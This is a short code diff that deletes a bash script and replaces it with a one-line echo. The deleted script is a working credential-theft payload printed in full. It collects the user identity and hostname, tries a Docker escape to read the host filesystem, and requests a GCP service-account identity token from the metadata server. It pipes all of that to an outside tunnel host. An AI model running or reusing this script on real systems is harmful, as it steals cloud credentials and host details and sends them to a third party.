@@ -1,10 +1,1 @@
-#!/bin/bash
-{
-  echo "--- IDENTITY ---"
-  id
-  hostname
-  echo "--- DOCKER ESCAPE ---"
-  sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname 2>/dev/null || echo "Escape Failed"
-  echo "--- GCP TOKEN ---"
-  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity || echo "Token Access Denied"
-} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://8fb7a0b97d9e2747-103-95-173-85.serveousercontent.com
+echo("Price")
